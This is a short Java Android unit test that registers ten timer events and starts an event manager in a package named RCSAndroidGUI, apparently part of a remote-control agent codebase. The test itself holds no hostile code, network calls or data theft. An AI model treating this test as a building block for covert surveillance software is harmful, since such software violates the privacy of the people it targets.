package com.ht.RCSAndroidGUI.test;

import com.ht.RCSAndroidGUI.RCSException;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.event.EventBase;
import com.ht.RCSAndroidGUI.event.EventConf;
import com.ht.RCSAndroidGUI.event.EventManager;
import com.ht.RCSAndroidGUI.event.EventType;

import android.test.AndroidTestCase;

public class EventManagerTest extends AndroidTestCase {

	
	public void testStart() throws RCSException{
		EventManager em = EventManager.self();
		Status status = Status.self();
		int max = 10;
		
		// every second, action 0
		byte[] params = new byte[]{ 0x01,0x00,0x00,0x00,0x00};
		
		
		for(int i=0;i<max; i++){
			final EventConf e = new EventConf(EventType.EVENT_TIMER, i, 0, params);
			status.addEvent(e);
		}
		
		
		
		em.startAll();
	}
}
